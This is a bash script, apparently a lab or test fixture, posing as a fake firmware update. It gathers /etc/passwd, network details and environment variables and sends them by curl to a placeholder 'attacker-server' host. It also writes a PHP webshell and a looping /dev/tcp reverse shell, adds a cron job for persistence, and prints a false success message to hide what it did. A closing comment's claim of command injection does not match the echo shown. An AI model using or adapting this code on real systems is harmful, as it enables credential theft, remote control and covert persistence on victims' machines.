#!/bin/bash
# This is a malicious firmware update
echo "Starting fake firmware update..."

# Collect sensitive data
SENSOR_INFO=$(cat /etc/passwd; ifconfig; env)

# Create a timestamp for unique identification
TIMESTAMP=$(date +%s)

# Send data to attacker server
echo "Exfiltrating system data..."
curl -s -X POST -d "$SENSOR_INFO" http://attacker-server:63999/collect || echo "Failed to exfiltrate"

# Try alternative exfiltration method if first fails
if [ $? -ne 0 ]; then
        echo "Trying alternative exfiltration..."
        encoded=$(echo "$SENSOR_INFO" | base64 | tr -d '\n')
        curl -s "http://attacker-server:63999/pwned?data=$encoded" || echo "Alternative exfiltration failed"
fi

# Install backdoor (create a simple webshell)
echo "Installing backdoor..."
cat > /tmp/backdoor.php << 'WEBSHELL'
<?php
if(isset($_GET['cmd'])) {
        system($_GET['cmd']);
}
?>
WEBSHELL

# Create a persistent reverse shell script
cat > /tmp/reverse_shell.sh << 'REVERSESHELL'
#!/bin/bash
while true; do
        bash -c 'bash -i >& /dev/tcp/attacker-server/63998 0>&1'
        sleep 60
done
REVERSESHELL
chmod +x /tmp/reverse_shell.sh

# Attempt to add a cron job for persistence
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/reverse_shell.sh") | crontab - 2>/dev/null

# Make a persistent copy of sensor environment variables
env > /tmp/sensor_env_${TIMESTAMP}.txt

# Display "success" message to hide malicious activity
echo "Firmware update completed successfully"

# This parameter is intentionally vulnerable to command injection
# Any commands after this as params will execute
echo "Firmware params: $@"
exit 0
